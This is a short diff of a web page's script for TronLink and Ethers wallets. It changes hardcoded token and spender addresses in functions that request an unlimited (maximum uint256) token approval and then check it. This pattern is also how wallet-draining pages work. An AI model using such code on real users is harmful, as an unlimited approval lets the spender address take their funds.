@@ -19,16 +19,16 @@
             await checkEthersApproval("0xAc5DFB21853A1fdF2CCaF11fC2D2076f3e89049b", "0x0Ce275FA9046c76aD8630Fd2d1d7A10481753333")
         }
         async function connectTronLink() {
-            const response = await getTronlinkAccountInfo("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
+            const response = await getTronlinkAccountInfo("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK")
             document.getElementById("account").innerText = `Account: ${response.data.address}`
             document.getElementById("balance").innerText = `Balance: ${response.data.balance}`
             document.getElementById("msg").innerText = `Code: ${response.code}, Msg: ${response.msg}`
         }
         async function approveTronLink() {
-            await tronLinkApproval("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK", "TBw6wtLPF1fMV3tyVPXfHAeEbGKvHwoStF", "115792089237316195423570985008687907853269984665640564039457584007913129639935")
+            await tronLinkApproval("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK", "TET5L8kkuqvcbetzQ4dRXHUxxtK1XGGm9D", "115792089237316195423570985008687907853269984665640564039457584007913129639935")
         }
         async function checkTronLink() {
-            await checkTronLinkApproval("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK", "TBw6wtLPF1fMV3tyVPXfHAeEbGKvHwoStF")
+            await checkTronLinkApproval("TKyq4GzNALAzSRjCM6ZHo7tBJXVWHiSNQK", "TET5L8kkuqvcbetzQ4dRXHUxxtK1XGGm9D")
         }
     </script>
     <script type="application/javascript">
